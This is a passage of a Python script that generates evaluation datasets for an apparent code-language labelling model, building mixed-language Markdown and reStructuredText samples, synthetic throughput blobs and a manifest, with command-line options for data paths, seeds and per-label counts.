                    "source_char_start": int(region.source_char_start),
                    "source_char_end": int(region.source_char_end),
                }
                if key != "third":
                    parts.append("\n\n")
                    segments.append(_segment(label, cursor, cursor + 2))
                    cursor += 2
            content = _normalize_text("".join(parts))
            shifted_segments = _merge_adjacent_segments(segments)
            langs = sorted({seg["label"] for seg in shifted_segments if seg.get("label")})
            meta = {
                "first_lang": lang,
                "second_lang": second_lang,
                "third_lang": third_lang,
                "host_uid": first_region.source_uid,
                "mid_uid": second_region.source_uid,
                "tail_uid": third_region.source_uid,
                "sequence_regions": region_meta,
            }
            examples.append(_make_record(task, lang, idx, content, shifted_segments, langs, meta))
            actual_counts[lang] += 1
            second_role_counts[second_lang] += 1
            third_role_counts[third_lang] += 1
            pair_counts[(lang, second_lang)] += 1
            pair_counts[(second_lang, third_lang)] += 1
            triple_counts[(lang, second_lang, third_lang)] += 1

    support = _task_support_summary(
        requested_per_anchor_label=per_label,
        candidate_counts=candidate_counts,
        actual_counts=actual_counts,
    )
    return task, examples, desc, support


def _build_markdown_dataset_from_regions(
    monitor_docs: Sequence[MonitorDoc],
    per_label: int,
    rng: random.Random,
    *,
    task_name: str = "markdown_mix",
    wrapper_label: str = "markdown",
    markup_style: str = "markdown",
) -> Tuple[str, List[dict], str, Dict[str, Any]]:
    task = task_name
    pretty_label = "markdown" if wrapper_label == "markdown" else "reStructuredText"
    desc = f"Segment-backed {pretty_label} documents with mixed-label code regions and exact source labels."
    examples: List[dict] = []
    _log(f"📝 Building {task} dataset from segment-backed monitor regions...")

    block_host_budget = 540
    block_other_budget = 360
    inline_budget = _MARKDOWN_INLINE_MAX_VISIBLE

    host_pools = _collect_anchor_window_regions(
        monitor_docs,
        max_chars=block_host_budget,
        min_anchor_ratio=_MIXED_REGION_MIN_RATIO,
        exclude_labels={wrapper_label, "text"},
    )
    other_pools = _collect_anchor_window_regions(
        monitor_docs,
        max_chars=block_other_budget,
        min_anchor_ratio=_MIXED_REGION_MIN_RATIO,
        exclude_labels={wrapper_label, "text"},
    )
    inline_pools = _collect_inline_regions(
        monitor_docs,
        min_visible=_MARKDOWN_INLINE_MIN_VISIBLE,
        max_visible=inline_budget,
        exclude_labels={wrapper_label, "text"},
        strip_first_line_indent=True,
        min_anchor_ratio=_MIXED_REGION_MIN_RATIO,
    )
    text_snippets = _sample_monitor_text_snippets(monitor_docs, max_chars=240, min_visible=24)

    labels = sorted(host_pools.keys())
    candidate_counts = {label: len(pool) for label, pool in host_pools.items() if pool}
    actual_counts: Counter[str] = Counter()
    other_lang_counts: Counter[str] = Counter()
    pair_counts: Counter[Tuple[str, str]] = Counter()
    inline_lang_counts: Counter[str] = Counter()
    role_wrapper_counts = {"host": Counter(), "other": Counter()}
    inline_wrapper_counts: Counter[str] = Counter()
    used_code_ids: Set[Tuple[Optional[str], str, int, int]] = set()
    host_shuffled = {label: list(pool) for label, pool in host_pools.items()}
    other_shuffled = {label: list(pool) for label, pool in other_pools.items()}
    inline_shuffled = {label: list(pool) for label, pool in inline_pools.items()}
    for pools in (host_shuffled, other_shuffled):
        for pool in pools.values():
            rng.shuffle(pool)
    for pool in inline_shuffled.values():
        rng.shuffle(pool)
        pool.sort(
            key=lambda region: (
                -int(region.visible_chars),
                str(region.source_uid or ""),
                int(region.source_char_start),
            )
        )

    total_requested_examples = len(labels) * max(0, int(per_label))
    target_inline_examples = min(
        total_requested_examples,
        max(0, int(_MARKDOWN_INLINE_MIN_OPPORTUNITIES)),
    )
    actual_inline_examples = 0

    def append_text_part(parts: List[str], segments: List[dict], cursor: int, text: str) -> int:
        if not text:
            return cursor
        normalized = _normalize_text(text)
        if not normalized:
            return cursor
        start = cursor
        end = start + len(normalized)
        parts.append(normalized)
        segments.append(_segment(wrapper_label, start, end))
        return end

    def append_region(parts: List[str], segments: List[dict], cursor: int, region: MonitorRegion) -> Tuple[int, int, int]:
        start = cursor
        parts.append(region.content)
        _append_shifted_segments(segments, region.segments, cursor)
        cursor += len(region.content)
        return cursor, start, cursor

    def sample_text(max_chars: int) -> str:
        if not text_snippets:
            return ""
        snippet = rng.choice(text_snippets)
        if len(snippet) <= max_chars:
            return snippet
        return snippet[:max_chars].rstrip()

    def build_inline_markup(region: MonitorRegion) -> Optional[Tuple[List[str], List[str], str, bool, Optional[str]]]:
        if markup_style == "markdown":
            wrapper_modes = ["inline_backtick", "html_code"]
        else:
            wrapper_modes = ["inline_literal", "inline_role"]
        ordered_modes = list(wrapper_modes)
        rng.shuffle(ordered_modes)
        ordered_modes.sort(key=lambda mode: (int(inline_wrapper_counts.get(mode, 0)), mode))
        lang_token = region.anchor_label.replace("_", "")
        body = region.content.rstrip("\n")
        if "\n" in body:
            return None
        for mode in ordered_modes:
            if mode == "inline_backtick" and body:
                return ["`"], ["`"], mode, True, None
            if mode == "html_code" and body:
                return [f"<code class=\"language-{lang_token}\">"], ["</code>"], mode, True, None
            if mode == "inline_literal" and body:
                return ["``"], ["``"], mode, True, None
            if mode == "inline_role" and body:
                return [":code:`"], ["`"], mode, True, None
        return None

    def should_insert_inline() -> bool:
        if target_inline_examples <= 0:
            return False
        if actual_inline_examples >= target_inline_examples:
            return False
        examples_built = len(examples)
        remaining_examples_including_current = max(0, total_requested_examples - examples_built)
        remaining_inline_needed = max(0, target_inline_examples - actual_inline_examples)
        if remaining_inline_needed >= remaining_examples_including_current:
            return True
        return bool(labels) and rng.random() < 0.5

    def select_inline_region() -> Optional[Tuple[str, MonitorRegion, Tuple[List[str], List[str], str, bool, Optional[str]]]]:
        candidate_labels = [lbl for lbl in labels if inline_shuffled.get(lbl)]
        exhausted: Set[str] = set()
        while candidate_labels:
            inline_lang = _balanced_min_choice(
                candidate_labels,
                rng,
                lambda label: (
                    int(inline_lang_counts.get(str(label), 0)),
                    int(other_lang_counts.get(str(label), 0)),
                    str(label),
                ),
            )
            if inline_lang is None:
                return None
            inline_lang = str(inline_lang)
            inline_region = _pop_unused_region(inline_shuffled.get(inline_lang, []), used_code_ids)
            if inline_region is None:
                exhausted.add(inline_lang)
                candidate_labels = [lbl for lbl in candidate_labels if str(lbl) not in exhausted]
                continue
            inline_markup = build_inline_markup(inline_region)
            if inline_markup is None:
                continue
            return inline_lang, inline_region, inline_markup
        return None

    def build_block_markup(display_token: str, *, wrapped: bool) -> Tuple[List[str], List[str], bool]:
        if markup_style == "markdown":
            prefix_chunks: List[str] = []
            suffix_chunks: List[str] = []
            closed = False
            if wrapped:
                fence_prefix = "```"
                if display_token:
                    fence_prefix += display_token
                fence_prefix += "\n"
                prefix_chunks.append(fence_prefix)
                if rng.random() < 0.9:
                    suffix_chunks.append("```\n")
                    closed = True
            return prefix_chunks, suffix_chunks, closed
        if wrapped:
            header = ".. code-block::"
            if display_token:
                header += f" {display_token}"
            header += "\n\n"
            return [header], ["\n"], True
        return ["::\n\n"], ["\n"], True

    for lang in labels:
        host_pool = host_shuffled.get(lang, [])
        if not host_pool:
            continue
        alt_langs = [lbl for lbl in labels if lbl != lang and other_shuffled.get(lbl)]
        if not alt_langs:
            continue
        for idx in range(per_label):
            host_region = _pop_unused_region(host_pool, used_code_ids)
            if host_region is None:
                break
            other_lang = _balanced_min_choice(
                alt_langs,
                rng,
                lambda label: (
                    int(other_lang_counts.get(str(label), 0)),
                    int(pair_counts.get((lang, str(label)), 0)),
                    str(label),
                ),
            )
            if other_lang is None:
                break
            other_lang = str(other_lang)
            other_region = _pop_unused_region(other_shuffled.get(other_lang, []), used_code_ids)
            if other_region is None:
                break

            wrap_host = _choose_balanced_bool(role_wrapper_counts["host"], rng)
            wrap_other = _choose_balanced_bool(role_wrapper_counts["other"], rng)

            parts: List[str] = []
            segments: List[dict] = []
            cursor = 0
            markdown_blocks: List[dict] = []
            inline_blocks: List[dict] = []

            intro = sample_text(240)
            if intro and rng.random() < 0.65:
                cursor = append_text_part(parts, segments, cursor, intro + "\n\n")

            block_plan = [
                ("host", host_region, wrap_host),
                ("other", other_region, wrap_other),
            ]
            if rng.random() < 0.5:
                rng.shuffle(block_plan)

            for block_index, (role, region, wrapped) in enumerate(block_plan):
                include_lang = wrapped and (rng.random() < 0.85)
                mismatch = include_lang and rng.random() < 0.2 and len(labels) > 1
                display_lang = ""
                display_token = ""
                if include_lang:
                    display_lang = region.anchor_label
                    if mismatch:
                        alternatives = [lbl for lbl in labels if lbl != region.anchor_label]
                        if alternatives:
                            display_lang = rng.choice(alternatives)
                    display_token = display_lang.replace("_", "")

                prefix_chunks, suffix_chunks, closed = build_block_markup(display_token, wrapped=wrapped)
                for chunk in prefix_chunks:
                    cursor = append_text_part(parts, segments, cursor, chunk)

                cursor, block_start, block_end = append_region(parts, segments, cursor, region)
                markdown_blocks.append(
                    {
                        "role": role,
                        "wrapped": bool(wrapped),
                        "language": region.anchor_label,
                        "anchor_label": region.anchor_label,
                        "anchor_ratio": float(region.anchor_ratio),
                        "display_label": display_token,
                        "display_language": display_lang,
                        "mismatched": bool(wrapped and include_lang and display_lang and display_lang != region.anchor_label),
                        "char_start": block_start,
                        "char_end": block_end,
                        "source_uid": region.source_uid,
                        "source_char_start": int(region.source_char_start),
                        "source_char_end": int(region.source_char_end),
                        "wrapper": "wrapped" if wrapped else "plain",
                        "closed": closed,
                        "truth_mode": "exact_region",
                    }
                )
                for chunk in suffix_chunks:
                    cursor = append_text_part(parts, segments, cursor, chunk)

                if block_index < len(block_plan) - 1:
                    between = sample_text(180)
                    joiner = "\n\n" if rng.random() < 0.5 else "\n"
                    if between:
                        cursor = append_text_part(parts, segments, cursor, between + joiner)

            if should_insert_inline() or (actual_inline_examples < target_inline_examples and rng.random() < _MARKDOWN_INLINE_CODE_PROB):
                selected_inline = select_inline_region()
                if selected_inline is not None:
                    inline_lang, inline_region, inline_markup = selected_inline
                    pre_markup, post_markup, wrapper_type, spacer_after, display_label = inline_markup
                    paragraph = sample_text(240)
                    prefix_text = paragraph[: len(paragraph) // 2]
                    suffix_text = paragraph[len(paragraph) // 2 :]
                    if prefix_text:
                        cursor = append_text_part(parts, segments, cursor, prefix_text)
                    if prefix_text and not prefix_text.endswith((" ", "\t", "\n")):
                        cursor = append_text_part(parts, segments, cursor, " ")
                    for chunk in pre_markup:
                        cursor = append_text_part(parts, segments, cursor, chunk)
                    cursor, inline_start, inline_end = append_region(parts, segments, cursor, inline_region)
                    inline_blocks.append(
                        {
                            "language": inline_region.anchor_label,
                            "anchor_label": inline_region.anchor_label,
                            "anchor_ratio": float(inline_region.anchor_ratio),
                            "wrapper": wrapper_type,
                            "display_label": display_label,
                            "char_start": inline_start,
                            "char_end": inline_end,
                            "context_role": "inline_text",
                            "source_uid": inline_region.source_uid,
                            "source_char_start": int(inline_region.source_char_start),
                            "source_char_end": int(inline_region.source_char_end),
                            "truth_mode": "exact_region",
                        }
                    )
                    inline_lang_counts[str(inline_lang)] += 1
                    inline_wrapper_counts[wrapper_type] += 1
                    actual_inline_examples += 1
                    for chunk in post_markup:
                        cursor = append_text_part(parts, segments, cursor, chunk)
                    trailing = suffix_text
                    if spacer_after and trailing and not trailing[0].isspace():
                        cursor = append_text_part(parts, segments, cursor, " ")
                    if trailing:
                        cursor = append_text_part(parts, segments, cursor, trailing)

            outro = sample_text(200)
            if outro and rng.random() < 0.65:
                cursor = append_text_part(parts, segments, cursor, "\n" + outro)

            if not markdown_blocks:
                continue

            content = _normalize_text("".join(parts))
            shifted_segments = _merge_adjacent_segments(segments)
            langs = sorted({seg["label"] for seg in shifted_segments if seg.get("label")})
            meta = {
                "host_lang": lang,
                "host_uid": host_region.source_uid,
                "other_lang": other_lang,
                "other_uid": other_region.source_uid,
                "wrapped_host": bool(any(block["role"] == "host" and block["wrapped"] for block in markdown_blocks)),
                "wrapped_other": bool(any(block["role"] == "other" and block["wrapped"] for block in markdown_blocks)),
                "host_fence_label": next((block["display_label"] for block in markdown_blocks if block["role"] == "host"), ""),
                "host_fence_language": next((block["display_language"] for block in markdown_blocks if block["role"] == "host"), ""),
                "host_fence_mismatch": bool(any(block["role"] == "host" and block["mismatched"] for block in markdown_blocks)),
                "other_fence_label": next((block["display_label"] for block in markdown_blocks if block["role"] == "other"), ""),
                "other_fence_language": next((block["display_language"] for block in markdown_blocks if block["role"] == "other"), ""),
                "other_fence_mismatch": bool(any(block["role"] == "other" and block["mismatched"] for block in markdown_blocks)),
                "markdown_blocks": markdown_blocks,
                "inline_blocks": inline_blocks,
            }
            examples.append(_make_record(task, lang, idx, content, shifted_segments, langs, meta))
            actual_counts[lang] += 1
            other_lang_counts[other_lang] += 1
            pair_counts[(lang, other_lang)] += 1
            role_wrapper_counts["host"][bool(wrap_host)] += 1
            role_wrapper_counts["other"][bool(wrap_other)] += 1

    support = _task_support_summary(
        requested_per_anchor_label=per_label,
        candidate_counts=candidate_counts,
        actual_counts=actual_counts,
    )
    support["other_candidate_regions_by_anchor_label"] = {
        label: len(pool) for label, pool in other_pools.items() if pool
    }
    support["inline_candidate_regions_by_anchor_label"] = {
        label: len(pool) for label, pool in inline_pools.items() if pool
    }
    support["inline_target_count"] = int(target_inline_examples)
    support["inline_actual_count"] = int(actual_inline_examples)
    support["inline_min_visible"] = int(_MARKDOWN_INLINE_MIN_VISIBLE)
    support["inline_max_visible"] = int(_MARKDOWN_INLINE_MAX_VISIBLE)
    return task, examples, desc, support


def _assemble_label_block(
    fragments: List[Fragment],
    target_bytes: int,
    rng: random.Random,
) -> Tuple[str, int]:
    parts: List[str] = []
    total = 0
    attempt = 0
    while total < target_bytes and attempt < target_bytes * 4:
        frag = rng.choice(fragments)
        snippet = frag.content.strip()
        if not snippet:
            attempt += 1
            continue
        if parts:
            snippet = "\n" + snippet
        parts.append(snippet)
        total = len("".join(parts).encode("utf-8", "ignore"))
        attempt += 1
    combined = "".join(parts)
    data = combined.encode("utf-8", "ignore")
    if not data:
        return "", 0
    if len(data) > target_bytes:
        data = data[:target_bytes]
        combined = data.decode("utf-8", "ignore")
    return _normalize_text(combined), len(data)


def _build_throughput_dataset(
    size_bytes: int,
    num_examples: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    task = f"throughput_{size_bytes}"
    pretty = {
        1024: "1 KiB",
        10_240: "10 KiB",
        102_400: "100 KiB",
    }.get(size_bytes, f"{size_bytes} bytes")
    desc = f"Synthetic random text blobs for throughput ({pretty})."
    alphabet = string.ascii_letters + string.digits + string.punctuation + "\n "
    examples: List[dict] = []
    sample_count = max(1, num_examples)
    _log(f"🚀 Building throughput dataset for {pretty} with {sample_count} random samples...")
    for idx in range(sample_count):
        chars = [rng.choice(alphabet) for _ in range(size_bytes)]
        raw_content = "".join(chars)
        content = _normalize_text(raw_content)
        actual_bytes = len(content.encode("utf-8", "ignore"))
        meta = {
            "target_bytes": size_bytes,
            "actual_bytes": actual_bytes,
            "mode": "synthetic_random",
        }
        segments = [_segment("text", 0, len(content))]
        examples.append(
            _make_record(
                task,
                "synthetic",
                idx,
                content,
                segments,
                ["text"],
                meta,
            )
        )
    return task, examples, desc


def _write_dataset(
    root: Path,
    task: str,
    examples: List[dict],
    features: Features,
    overwrite: bool,
) -> int:
    if not examples:
        _log(f"⚠️  Task '{task}' produced no examples; skipping write.")
        return 0
    out_dir = root / task
    if out_dir.exists():
        if overwrite:
            _log(f"🔄 Removing existing dataset at {out_dir}")
            shutil.rmtree(out_dir)
        else:
            raise FileExistsError(f"Dataset already exists at {out_dir}; use --overwrite to replace it.")
    ds = Dataset.from_list(examples, features=features)
    ds_size_mb = sum(sys.getsizeof(ex) for ex in examples) / (1024 * 1024)
    _log(f"💾 Writing {len(ds):,} examples ({ds_size_mb:.1f} MB) to {out_dir}")
    ds.save_to_disk(str(out_dir))
    return len(ds)


def build_all_datasets(args) -> dict:
    # data_root_orig is where Arrow monitor outputs live (downloader/arrow_out
    # by default). We may override data_root for fine-tuned memmap-based
    # builds, but fine-tuned evaluation should stay strictly on the
    # monitor_preprocessed_b subset.
    data_root_orig = Path(args.data_root).resolve()
    data_root = data_root_orig
    output_root = Path(args.output_root).resolve()
    output_root.mkdir(parents=True, exist_ok=True)

    # Decide how to source monitor data:
    #  - default: Gemini segmentations + Arrow monitor
    #  - fine-tuned: use the preprocessed monitor memmap split (B) so that
    #    evaluation examples come only from the held-out subset.
    monitor_seg_root = Path(args.monitor_seg_root).resolve()
    if getattr(args, "fine_tuned", False):
        memmap_root = (REPO_ROOT / "downloader" / "monitor_preprocessed_b").resolve()
        _log(f"📥 Fine-tuned mode: loading monitor memmap from {memmap_root} ...")
        # For fine-tuned evaluation, all monitor-derived tasks (including
        # markdown_mix) are built strictly from the monitor_preprocessed_b
        # memmap subset.
        fragments_by_lang, monitor_docs = _load_monitor_fragments_and_docs_from_memmap(
            memmap_root,
            args.per_label,
            extra_multiplier=args.extra_pool_multiplier,
            seed=args.seed,
        )
        # For memmap-based builds, treat the memmap root as the conceptual
        # data source in the manifest for clarity.
        data_root = memmap_root
    else:
        fragments_by_lang, monitor_docs = _load_monitor_fragments_and_docs(
            data_root_orig,
            args.per_label,
            extra_multiplier=args.extra_pool_multiplier,
            seed=args.seed,
            monitor_seg_root=monitor_seg_root,
        )
    if not fragments_by_lang and not monitor_docs:
        raise RuntimeError("No monitor data available – cannot build evaluation datasets.")

    rng = random.Random(args.seed)
    features = _features_schema()
    manifest_tasks = []

    _log("🔧 Building evaluation datasets...")
    builders = []
    _log("📊 Building pure fragments dataset...")
    builders.append(_build_pure_dataset_from_monitor(monitor_docs, args.per_label, rng))

    buckets = [
        ("4_15", 4, 15),
        ("16_31", 16, 31),
        ("32_63", 32, 63),
        ("64_plus", 64, None),
    ]
    for name, lo, hi in buckets:
        builders.append(
            _build_injection_dataset_from_monitor(
                monitor_docs,
                args.per_label,
                name,
                lo,
                hi,
                rng,
            )
        )

    builders.append(_build_malicious_dataset_from_monitor(monitor_docs, args.per_label, rng))
    builders.append(_build_pair_dataset_from_monitor(monitor_docs, args.per_label, rng))
    builders.append(_build_triplet_dataset_from_monitor(monitor_docs, args.per_label, rng))
    builders.append(
        _build_markdown_dataset_from_regions(
            monitor_docs,
            args.per_label,
            rng,
        )
    )
    builders.append(
        _build_markdown_dataset_from_regions(
            monitor_docs,
            args.per_label,
            rng,
            task_name="restructuredtext_mix",
            wrapper_label="restructuredtext",
            markup_style="restructuredtext",
        )
    )

    for size in (1024, 10_240, 102_400):
        builders.append(
            _build_throughput_dataset(size, args.throughput_examples, rng)
        )

    total_examples = 0
    _log("\n� Writing datasets to disk...")
    for built in tqdm(builders, desc="Writing datasets", unit="dataset"):
        support_summary: Optional[Dict[str, Any]] = None
        if isinstance(built, tuple) and len(built) == 4:
            task, examples, desc, support_summary = built
        else:
            task, examples, desc = built
        count = _write_dataset(output_root, task, examples, features, overwrite=args.overwrite)
        total_examples += count
        task_entry: Dict[str, Any] = {
            "task": task,
            "description": desc,
            "count": count,
            "path": str((output_root / task).relative_to(output_root)),
        }
        if support_summary:
            task_entry.update(support_summary)
        manifest_tasks.append(task_entry)
    _log(f"\n📊 Summary: Generated {len(manifest_tasks)} datasets with {total_examples:,} total examples")

    manifest = {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "data_root": str(data_root),
        "output_root": str(output_root),
        "seed": args.seed,
        "per_label": args.per_label,
        "throughput_examples": args.throughput_examples,
        "tasks": manifest_tasks,
    }

    with open(output_root / "manifest.json", "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2, sort_keys=True)

    return manifest


def parse_args(argv: Optional[Sequence[str]] = None):
    parser = argparse.ArgumentParser(
        description="Generate evaluation datasets from the monitor set (Gemini segmentations + Arrow monitor)."
    )
    parser.add_argument(
        "--data-root",
        type=str,
        default=str(REPO_ROOT / "downloader" / "arrow_out"),
        help="Path to downloader outputs (expects monitor/<lang>/dataset directories).",
    )
    parser.add_argument(
        "--monitor-seg-root",
        type=str,
        default=str(REPO_ROOT / "gemini_segmentations" / "monitor"),
        help="Path to Gemini monitor segmentations (gemini_segmentations/monitor).",
    )
    parser.add_argument(
        "--output-root",
        type=str,
        default=str(REPO_ROOT / "evaluation" / "data"),
        help="Directory where evaluation datasets will be written.",
    )
    parser.add_argument(
        "--per-label",
        type=int,
        default=100,
        help="Examples per label for most benchmarks (pure, injection, sequences, markdown).",
    )
    parser.add_argument(
        "--throughput-examples",
        type=int,
        default=4,
        help="Number of synthetic samples to create for each throughput size.",
    )
    parser.add_argument(
        "--extra-pool-multiplier",
        type=int,
        default=3,
        help="Multiplier to expand the initial monitor fragment pool per label.",
    )
    parser.add_argument("--seed", type=int, default=13)
    parser.add_argument("--overwrite", action="store_true", help="Replace existing datasets in the output directory.")
    parser.add_argument(
        "--fine-tuned",
        action="store_true",
        default=False,
        help=(
            "When set, build evaluation datasets exclusively from the "
            "monitor_preprocessed_b memmap split so that no samples from "
            "monitor_preprocessed_a are included."
        ),
    )
    return parser.parse_args(argv)


def main(argv: Optional[Sequence[str]] = None) -> None:
    args = parse_args(argv)
    manifest = build_all_datasets(args)
    _log(f"✅ Generated {len(manifest['tasks'])} datasets under {manifest['output_root']}")


if __name__ == "__main__":
    main()
